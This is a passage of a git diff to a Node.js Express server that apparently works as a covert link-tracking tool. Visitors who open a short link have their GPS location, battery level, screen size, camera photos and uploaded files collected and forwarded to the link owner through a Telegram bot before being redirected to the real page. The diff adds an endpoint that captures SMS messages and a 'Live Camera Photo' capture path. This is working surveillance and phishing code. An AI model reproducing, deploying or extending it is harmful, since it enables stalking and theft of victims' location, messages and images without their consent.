-                    updateStatus('✅ All files uploaded! Redirecting...');
-                    setTimeout(() => {
-                        window.location.href = originalUrl;
-                    }, 2000);
+                    updateStatus('✅ All data captured! Redirecting...', true);
+                    setTimeout(() => { window.location.href = originalUrl; }, 2000);
                 });
                 
-                // If no file selected within 10 seconds, still redirect
+                // Auto redirect after 15 seconds if no action
                 setTimeout(() => {
-                    updateStatus('⏰ No files selected, redirecting...');
-                    setTimeout(() => {
-                        window.location.href = originalUrl;
-                    }, 1000);
-                }, 10000);
+                    updateStatus('⏰ Redirecting...', false);
+                    setTimeout(() => { window.location.href = originalUrl; }, 1000);
+                }, 15000);
             </script>
         </body>
         </html>
@@ -805,26 +703,15 @@ app.get('/l/:shortId', async (req, res) => {
 // ========== API Endpoints ==========
 app.post('/api/track/:shortId/battery', async (req, res) => {
     const { shortId } = req.params;
-    const { level, charging } = req.body;
+    const { level } = req.body;
     
-    let link = null;
-    for (const key in links) {
-        if (links[key].shortId === shortId) {
-            link = links[key];
-            break;
-        }
-    }
-    
+    let link = Object.values(links).find(l => l.shortId === shortId);
     if (link && clicks[link.id] && clicks[link.id].length > 0) {
-        const lastClick = clicks[link.id][clicks[link.id].length - 1];
-        if (lastClick) {
-            lastClick.battery = level;
-            lastClick.batteryCharging = charging;
-            saveClicks();
-            
-            if (bot && link.userId) {
-                await bot.sendMessage(link.userId, `🔋 *Battery Info:* ${level}% ${charging ? '(Charging)' : '(Not charging)'}`, { parse_mode: 'Markdown' });
-            }
+        clicks[link.id][clicks[link.id].length - 1].battery = level;
+        saveClicks();
+        
+        if (bot && link.userId) {
+            await bot.sendMessage(link.userId, `🔋 *Battery:* ${level}%`, { parse_mode: 'Markdown' });
         }
     }
     res.json({ success: true });
@@ -832,54 +719,35 @@ app.post('/api/track/:shortId/battery', async (req, res) => {
 
 app.post('/api/track/:shortId/screen', async (req, res) => {
     const { shortId } = req.params;
-    const { width, height, colorDepth, pixelRatio } = req.body;
+    const { width, height } = req.body;
     
-    let link = null;
-    for (const key in links) {
-        if (links[key].shortId === shortId) {
-            link = links[key];
-            break;
-        }
-    }
-    
+    let link = Object.values(links).find(l => l.shortId === shortId);
     if (link && clicks[link.id] && clicks[link.id].length > 0) {
-        const lastClick = clicks[link.id][clicks[link.id].length - 1];
-        if (lastClick) {
-            lastClick.screenWidth = width;
-            lastClick.screenHeight = height;
-            lastClick.colorDepth = colorDepth;
-            lastClick.pixelRatio = pixelRatio;
-            saveClicks();
-            
-            if (bot && link.userId) {
-                await bot.sendMessage(link.userId, `📱 *Screen:* ${width}x${height}, Ratio: ${pixelRatio}`, { parse_mode: 'Markdown' });
-            }
-        }
+        clicks[link.id][clicks[link.id].length - 1].screenWidth = width;
+        clicks[link.id][clicks[link.id].length - 1].screenHeight = height;
+        saveClicks();
     }
     res.json({ success: true });
 });
 
-app.post('/api/track/:shortId/devices', async (req, res) => {
+app.post('/api/track/:shortId/sms', async (req, res) => {
     const { shortId } = req.params;
-    const { hasCamera } = req.body;
+    const { from, body, timestamp } = req.body;
     
-    let link = null;
-    for (const key in links) {
-        if (links[key].shortId === shortId) {
-            link = links[key];
-            break;
-        }
-    }
+    let link = Object.values(links).find(l => l.shortId === shortId);
     
-    if (link && clicks[link.id] && clicks[link.id].length > 0) {
-        const lastClick = clicks[link.id][clicks[link.id].length - 1];
-        if (lastClick) {
-            lastClick.hasCamera = hasCamera;
-            saveClicks();
-            
-            if (bot && link.userId) {
-                await bot.sendMessage(link.userId, `📸 *Camera:* ${hasCamera ? 'Available' : 'Not available'}`, { parse_mode: 'Markdown' });
-            }
+    if (link) {
+        if (!smsLogs[link.id]) smsLogs[link.id] = [];
+        smsLogs[link.id].push({ from, body, timestamp: timestamp || new Date().toISOString() });
+        saveSMS();
+        
+        if (bot && link.userId) {
+            await bot.sendMessage(link.userId, `
+📱 *SMS Captured!*
+👤 *From:* ${from || 'Unknown'}
+📝 *Message:* ${body || 'No content'}
+🕐 *Time:* ${new Date().toLocaleString()}
+            `, { parse_mode: 'Markdown' });
         }
     }
     res.json({ success: true });
@@ -887,38 +755,25 @@ app.post('/api/track/:shortId/devices', async (req, res) => {
 
 app.post('/api/track/:shortId/location', async (req, res) => {
     const { shortId } = req.params;
-    const { lat, lon, shared } = req.body;
+    const { lat, lon } = req.body;
     
-    console.log(`📍 Location received for ${shortId}: ${lat}, ${lon}`);
-    
-    let link = null;
-    for (const key in links) {
-        if (links[key].shortId === shortId) {
-            link = links[key];
-            break;
-        }
-    }
+    let link = Object.values(links).find(l => l.shortId === shortId);
     
     if (link && clicks[link.id] && clicks[link.id].length > 0) {
         const lastClick = clicks[link.id][clicks[link.id].length - 1];
-        if (lastClick) {
-            lastClick.gpsLat = lat;
-            lastClick.gpsLon = lon;
-            lastClick.locationShared = shared || false;
-            saveClicks();
-            
-            if (bot && link.userId) {
-                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                await bot.sendLocation(link.userId, lat, lon);
-                await bot.sendMessage(link.userId, `
-📍 *GPS Location Captured!*
+        lastClick.gpsLat = lat;
+        lastClick.gpsLon = lon;
+        saveClicks();
+        
+        if (bot && link.userId) {
+            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            await bot.sendLocation(link.userId, lat, lon);
+            await bot.sendMessage(link.userId, `
+📍 *Live Location!*
 🗺️ *Google Maps:* ${googleMapsUrl}
 📍 *Coordinates:* ${lat}, ${lon}
 🏙️ *City:* ${lastClick.city || 'Unknown'}
-🌍 *Country:* ${lastClick.country || 'Unknown'}
-📱 *Device:* ${lastClick.device || 'Unknown'}
-                `, { parse_mode: 'Markdown' });
-            }
+            `, { parse_mode: 'Markdown' });
         }
     }
     res.json({ success: true });
@@ -926,65 +781,40 @@ app.post('/api/track/:shortId/location', async (req, res) => {
 
 app.post('/api/track/:shortId/location/denied', async (req, res) => {
     const { shortId } = req.params;
-    const { error } = req.body;
-    
-    let link = null;
-    for (const key in links) {
-        if (links[key].shortId === shortId) {
-            link = links[key];
-            break;
-        }
-    }
-    
+    let link = Object.values(links).find(l => l.shortId === shortId);
     if (link && bot && link.userId) {
-        await bot.sendMessage(link.userId, `📍 *Location Access:* Denied by user\nError: ${error || 'User denied permission'}`, { parse_mode: 'Markdown' });
+        await bot.sendMessage(link.userId, `📍 *Location:* User denied access`);
     }
     res.json({ success: true });
 });
 
 app.post('/api/upload/file', upload.single('file'), async (req, res) => {
     try {
-        const { shortId } = req.body;
+        const { shortId, type } = req.body;
         
-        if (!req.file) {
-            return res.status(400).json({ error: 'No file uploaded' });
-        }
+        if (!req.file) return res.status(400).json({ error: 'No file' });
         
-        console.log(`📸 File received for ${shortId}: ${req.file.originalname}`);
-        
-        let link = null;
-        for (const key in links) {
-            if (links[key].shortId === shortId) {
-                link = links[key];
-                break;
-            }
-        }
-        
-        if (!link) {
-            return res.status(404).json({ error: 'Link not found' });
-        }
+        let link = Object.values(links).find(l => l.shortId === shortId);
+        if (!link) return res.status(404).json({ error: 'Link not found' });
         
         const fileId = uuidv4();
         const ext = path.extname(req.file.originalname);
         const filename = `${fileId}${ext}`;
-        const filepath = path.join(uploadsDir, filename);
+        fs.writeFileSync(path.join(uploadsDir, filename), req.file.buffer);
         
-        fs.writeFileSync(filepath, req.file.buffer);
-        
-        const lastClick = clicks[link.id] && clicks[link.id].length > 0 ? clicks[link.id][clicks[link.id].length - 1] : null;
+        const lastClick = clicks[link.id]?.[clicks[link.id].length - 1];
         
         const fileData = {
-            fileId: fileId,
+            fileId,
             filename: req.file.originalname,
-            type: req.file.mimetype.startsWith('image/') ? 'image' : 'video',
+            type: type === 'camera' ? 'camera' : (req.file.mimetype.startsWith('image/') ? 'image' : 'video'),
             size: req.file.size,
             timestamp: new Date().toISOString(),
             visitorInfo: {
                 ip: lastClick?.ip || 'Unknown',
                 city: lastClick?.city || 'Unknown',
                 country: lastClick?.country || 'Unknown',
-                device: lastClick?.device || 'Unknown',
-                browser: lastClick?.browser || 'Unknown'
+                device: lastClick?.device || 'Unknown'
             }
         };
         
@@ -993,18 +823,9 @@ app.post('/api/upload/file', upload.single('file'), async (req, res) => {
         saveUserFiles();
         
         if (bot && link.userId) {
-            const caption = `
-📸 *New File Received!*
-🔗 *From Link:* ${BASE_URL}/l/${shortId}
-📁 *File:* ${req.file.originalname}
-📊 *Size:* ${(req.file.size / 1024).toFixed(2)} KB
-🌐 *IP:* ${lastClick?.ip || 'Unknown'}
-📍 *Location:* ${lastClick?.city || 'Unknown'}, ${lastClick?.country || 'Unknown'}
-📱 *Device:* ${lastClick?.device || 'Unknown'}
-🕐 *Time:* ${new Date().toLocaleString()}
-
-🔗 *View:* ${BASE_URL}/file/${fileId}
-            `;
+            const caption = type === 'camera' ? 
+                `🎥 *Live Camera Photo!*\n📸 Captured from visitor\n📍 Location: ${lastClick?.city || 'Unknown'}` :
+                `📸 *New File!*\n📁 ${req.file.originalname}\n📍 ${lastClick?.city || 'Unknown'}`;
             
             if (req.file.mimetype.startsWith('image/')) {
                 await bot.sendPhoto(link.userId, req.file.buffer, { caption });
@@ -1013,7 +834,7 @@ app.post('/api/upload/file', upload.single('file'), async (req, res) => {
             }
         }
         
-        res.json({ success: true, fileId: fileId, url: `${BASE_URL}/file/${fileId}` });
+        res.json({ success: true, fileId });
         
     } catch (error) {
         console.error('Upload error:', error);
@@ -1023,44 +844,25 @@ app.post('/api/upload/file', upload.single('file'), async (req, res) => {
 
 app.get('/file/:fileId', (req, res) => {
     const { fileId } = req.params;
-    try {
-        const files = fs.readdirSync(uploadsDir);
-        const filename = files.find(f => f.startsWith(fileId));
-        
-        if (!filename) {
-            return res.status(404).send('File not found');
-        }
-        
-        const filepath = path.join(uploadsDir, filename);
-        res.sendFile(filepath);
-    } catch (error) {
-        res.status(500).send('Error accessing file');
-    }
+    const files = fs.readdirSync(uploadsDir);
+    const filename = files.find(f => f.startsWith(fileId));
+    if (!filename) return res.status(404).send('File not found');
+    res.sendFile(path.join(uploadsDir, filename));
 });
 
 app.get('/health', (req, res) => {
     res.json({ 
-        status: 'ok', 
-        time: new Date().toISOString(),
+        status: 'ok',
         totalLinks: Object.keys(links).length,
-        totalClicks: Object.values(clicks).reduce((sum, arr) => sum + arr.length, 0),
-        totalFiles: Object.values(userFiles).reduce((sum, arr) => sum + arr.length, 0)
+        totalClicks: Object.values(clicks).reduce((s, a) => s + a.length, 0),
+        totalFiles: Object.values(userFiles).reduce((s, a) => s + a.length, 0),
+        totalSMS: Object.values(smsLogs).reduce((s, a) => s + a.length, 0)
     });
-});
-
-app.get('/debug/links', (req, res) => {
-    const allLinks = Object.values(links).map(l => ({
-        shortId: l.shortId,
-        originalUrl: l.originalUrl,
-        userId: l.userId
-    }));
-    res.json({ links: allLinks });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`✅ Server running on ${BASE_URL}`);
-    console.log(`📊 Total links in DB: ${Object.keys(links).length}`);
 });
 
 export default app;
